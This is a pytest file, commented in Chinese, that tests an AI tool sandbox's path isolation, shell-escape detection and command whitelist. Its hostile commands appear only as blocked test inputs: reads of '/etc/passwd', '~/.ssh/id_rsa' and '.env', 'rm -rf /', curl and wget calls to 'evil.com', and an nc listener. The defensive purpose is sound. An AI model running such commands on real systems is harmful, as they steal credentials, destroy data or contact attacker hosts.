"""Tests for sandbox 隔离 —— 路径不泄露 + shell 逃逸拦截。

历史说明：本文件中文注释曾在 UTF-8/GBK 混转中损坏（私用区码位 + 换行被吞），
Python 无法解析，长期被 conftest 的 collect_ignore 隔离。此处按可还原内容修复，
**断言逻辑未改动**。
"""

from __future__ import annotations

import os

import pytest

from app.tools.context import set_tool_context
from app.tools.sandbox import (
    _has_escape,
    _parse_command,
    run_in_sandbox,
    sandbox_root,
    workspace_dir,
)


@pytest.fixture(autouse=True)
def _clean_context():
    """每个测试前设置唯一 user，结束后重置 contextvar（防跨测试污染）。"""
    yield
    set_tool_context(session_id="", user_id="", tenant_id="", gateway=None, subagent_depth=0)


class TestSandboxLocation:
    def test_workspace_is_outside_project(self):
        """S: workspace 路径不得包含项目名 python-engine（cwd 不泄露服务器结构）。"""
        set_tool_context(session_id="s", user_id="u1", tenant_id="t1", gateway=None)
        ws = str(workspace_dir())
        assert "python-engine" not in ws, f"workspace 泄露项目路径: {ws}"
        # 沙箱根在进程 cwd 上两级之上
        root = str(sandbox_root())
        assert "chiron-sandbox" in root
        cwd = os.getcwd()
        # Windows 驱动器号大小写可能不一致 (D:\ vs d:\)，用 normcase 归一化
        assert os.path.normcase(root).startswith(
            os.path.normcase(os.path.dirname(os.path.dirname(cwd)))
        ), f"沙箱根未移到项目外: {root}"

    def test_safe_join_rejects_escape(self):
        from app.tools.sandbox import safe_join

        set_tool_context(session_id="s", user_id="u1", tenant_id="t1", gateway=None)
        with pytest.raises(ValueError, match="escapes"):
            safe_join("../etc/passwd")
        with pytest.raises(ValueError, match="escapes"):
            safe_join("C:/Windows/win.ini")
        assert safe_join("a/b.txt").is_relative_to(workspace_dir())


class TestShellEscapeBlock:
    def test_absolute_path_detected(self):
        assert _has_escape("Get-ChildItem 'X:\\project\\chiron'") is not None
        assert _has_escape("dir C:\\Windows") is not None
        # 生产部署在 Linux/alpine：Unix 绝对路径/家目录/环境变量均为逃逸
        assert _has_escape("cat /etc/passwd") is not None
        assert _has_escape("cat $HOME/.env") is not None
        assert _has_escape("cat ~/.ssh/id_rsa") is not None
        assert _has_escape("ls /") is not None
        assert _has_escape("ls ..\\..\\..") is not None
        assert _has_escape("cd /d X:\\project") is not None
        # Windows cmd 单字符开关不应误判
        assert _has_escape("exit /b 7") is None

    def test_normal_commands_allowed(self):
        assert _has_escape("echo hello") is None
        assert _has_escape("dir") is None
        assert _has_escape("python script.py") is None
        assert _has_escape("Get-ChildItem -Force") is None

    @pytest.mark.asyncio
    async def test_run_in_sandbox_blocks_escape(self):
        set_tool_context(session_id="s", user_id="u1", tenant_id="t1", gateway=None)
        out = await run_in_sandbox("Get-ChildItem 'X:\\project\\chiron'")
        assert "error" in out and "blocked" in out["error"]

    @pytest.mark.asyncio
    async def test_run_in_sandbox_executes_normal(self):
        set_tool_context(session_id="s", user_id="u1", tenant_id="t1", gateway=None)
        # 使用 python -c 而非 echo（echo 是 shell 内建命令，create_subprocess_exec 无法直接执行）
        out = await run_in_sandbox('python -c "print(\'sandbox-ok\')"')
        assert "sandbox-ok" in out.get("stdout", "")


class TestCommandWhitelist:
    """命令白名单：只允许白名单内的可执行文件，拒绝其他一切。"""

    def test_python_allowed(self):
        args, err = _parse_command("python script.py")
        assert err is None
        assert args == ["python", "script.py"]

    def test_python3_allowed(self):
        args, err = _parse_command("python3 -c 'print(1)'")
        assert err is None

    def test_pip_not_allowed(self):
        """pip 不在白名单里：沙箱内不允许安装任意包（供应链 / 逃逸面）。

        注：本用例原为 test_pip_allowed，对应"pip 也算基础命令"的旧白名单；
        当前白名单刻意只保留解释器与只读基础命令
        （见 sandbox._ALLOWED_EXECUTABLES：python / python3 / git / echo / ls / cat …）。
        """
        _, err = _parse_command("pip install requests")
        assert err is not None
        assert "not allowed" in err

    def test_echo_allowed(self):
        args, err = _parse_command("echo hello world")
        assert err is None
        assert args == ["echo", "hello", "world"]

    def test_dangerous_commands_blocked(self):
        """rm / curl / wget / bash / sh / powershell 等危险命令必须被拒绝。"""
        for cmd in [
            "rm -rf /",
            "curl http://evil.com",
            "wget http://evil.com",
            "bash script.sh",
            "sh -c 'ls'",
            "powershell Get-Process",
            "cmd /c dir",
            "nc -l 4444",
        ]:
            _, err = _parse_command(cmd)
            assert err is not None, f"should be blocked: {cmd}"

    def test_empty_command_blocked(self):
        _, err = _parse_command("")
        assert err is not None

    def test_malformed_command_blocked(self):
        _, err = _parse_command('python -c "unterminated')
        assert err is not None

    @pytest.mark.asyncio
    async def test_run_in_sandbox_blocks_dangerous_command(self):
        """即使逃逸正则未命中，白名单也会拦截危险命令。"""
        set_tool_context(session_id="s", user_id="u1", tenant_id="t1", gateway=None)
        # "bash" 不在白名单中
        out = await run_in_sandbox("bash -c 'echo pwned'")
        assert "error" in out
        assert "blocked" in out["error"]


class TestPythonCodeLayerGuard:
    """交给解释器执行的**代码本身**必须过 code_guard。

    逃逸正则与白名单都只看命令文本，所以"代码层"的每条入口都要按来源分别处置：
    `python -c <code>`（含紧贴/组合开关）、`python <脚本.py>`（读文件内容）、
    `python -m mod`（源码不在 workspace，只能靠命令层）、`python -`（读 stdin，直接拒）。
    """

    def test_code_source_follows_python_cli_shape(self):
        from app.tools.sandbox import _python_code_operand

        # 内联代码：独立、紧贴、组合开关三种形态等价（实测都能跑）
        assert _python_code_operand(["-c", "print(1)"]) == ("inline", "print(1)")
        assert _python_code_operand(["-cprint(1)"]) == ("inline", "print(1)")
        assert _python_code_operand(["-Bc", "print(1)"]) == ("inline", "print(1)")
        assert _python_code_operand(["-Bcprint(1)"]) == ("inline", "print(1)")
        # 裸开关没有代码体 ⇒ inline + None（没什么可查，也不该误判成脚本）
        assert _python_code_operand(["-c"]) == ("inline", None)
        # 已安装模块：源码不在 workspace
        assert _python_code_operand(["-m", "json.tool"]) == ("module", "json.tool")
        assert _python_code_operand(["-mjson.tool"]) == ("module", "json.tool")
        # 脚本文件：第一个非选项参数才是，之后的都属于脚本自己的 argv
        assert _python_code_operand(["script.py"]) == ("script", "script.py")
        assert _python_code_operand(["s.py", "other.py"]) == ("script", "s.py")
        assert _python_code_operand(["-X", "importtime", "s.py"]) == ("script", "s.py")
        assert _python_code_operand(["--", "s.py"]) == ("script", "s.py")
        # -c / -m 之后的一切是 sys.argv，没有 workspace 内的源文件可查
        assert _python_code_operand(["-c", "print(1)", "extra"]) == ("inline", "print(1)")
        # 无参数
        assert _python_code_operand([]) == ("none", None)

    def test_script_argv_is_not_mistaken_for_interpreter_flag(self):
        """`python parse.py -c x` 里的 `-c` 属于脚本 argv，不是解释器开关。

        误判会拿 `-c` 后面的 `x` 去过静态检查 —— 既漏掉真正执行的 parse.py，
        又可能对无关字符串误报。
        """
        from app.tools.sandbox import _python_code_operand

        assert _python_code_operand(["parse.py", "-c", "import os"]) == ("script", "parse.py")

    def test_stdin_form_is_detected(self):
        from app.tools.sandbox import _python_code_operand

        assert _python_code_operand(["-"]) == ("stdin", None)
        assert _python_code_operand(["-", "extra"]) == ("stdin", None)

    @pytest.mark.asyncio
    async def test_stdin_form_is_blocked(self):
        """代码从 stdin 流入时命令文本里没有任何可查内容 ⇒ 拒（fail-closed）。"""
        set_tool_context(session_id="s", user_id="u1", tenant_id="t1", gateway=None)
        out = await run_in_sandbox("python -")
        assert "blocked" in out.get("error", ""), out

    @pytest.mark.asyncio
    async def test_script_file_content_is_guarded(self):
        from app.tools.sandbox import safe_join

        set_tool_context(session_id="s", user_id="u1", tenant_id="t1", gateway=None)
        path = safe_join("evil_guard_probe.py")
        path.write_text("import os\nprint(os.listdir('.'))\n", encoding="utf-8")
        try:
            out = await run_in_sandbox("python evil_guard_probe.py")
            assert "blocked" in out.get("error", ""), out
            assert "os" in out["error"]
        finally:
            path.unlink(missing_ok=True)

    @pytest.mark.asyncio
    async def test_benign_script_still_executes(self):
        from app.tools.sandbox import safe_join

        set_tool_context(session_id="s", user_id="u1", tenant_id="t1", gateway=None)
        path = safe_join("ok_guard_probe.py")
        path.write_text("print('script-ok')\n", encoding="utf-8")
        try:
            out = await run_in_sandbox("python ok_guard_probe.py")
            assert "script-ok" in out.get("stdout", ""), out
        finally:
            path.unlink(missing_ok=True)

    @pytest.mark.asyncio
    async def test_unreadable_script_is_blocked_not_skipped(self):
        """读不到内容 ⇒ 拦下（fail-closed）。"看不见"不能等于"不用查"。"""
        set_tool_context(session_id="s", user_id="u1", tenant_id="t1", gateway=None)
        out = await run_in_sandbox("python no_such_file_probe.py")
        assert "blocked" in out.get("error", ""), out
